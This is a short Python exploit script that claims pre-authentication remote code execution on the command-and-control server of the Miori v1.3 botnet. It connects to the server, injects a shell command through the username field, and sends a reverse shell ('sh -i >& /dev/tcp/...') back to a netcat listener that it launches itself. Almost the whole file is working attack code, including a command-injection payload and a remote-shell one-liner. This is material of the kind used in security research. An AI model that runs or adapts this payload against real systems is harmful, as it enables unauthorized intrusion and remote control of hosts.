# Exploit for Miori v1.3
# Pre-Auth RCE 
# Discovery: 27.08.2019
# Written by @v3ded 
# Not to be used for malicious purposes. @v3ded doesn't condone malicious behaviour.

import socket
import os
import sys
import threading
from time import sleep

def Listen(port):
	os.system("nc -nlvp {}".format(port))

if(len(sys.argv) != 5):
	exit("Usage:\n\tpython3 {} C2_IP C2_PORT LHOST LPORT".format(sys.argv[0]))

C2_IP   = sys.argv[1]
C2_PORT = sys.argv[2]
LHOST   = sys.argv[3]
LPORT   = sys.argv[4]

CMD  = "sh -i >& /dev/tcp/{}/{} 0>&1".format(LHOST, LPORT)

try:	
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((C2_IP, int(C2_PORT)))	
	

	print("Simulating a login command.")
	sock.send(bytes("login\r\n", "utf-8"))	
	
	sleep(1)
	print("Sending the payload.")
	sock.send(bytes('user";clear; {} ;# \r\n'.format(CMD),"utf-8"))
	
	
	sock.send(bytes('Press F to pay respects.\r\n',"utf-8"))
	sleep(1)
	
	t = threading.Thread(target=Listen, args=(int(sys.argv[4]),))
	t.start()

except Exception as err:
	exit(str(err))
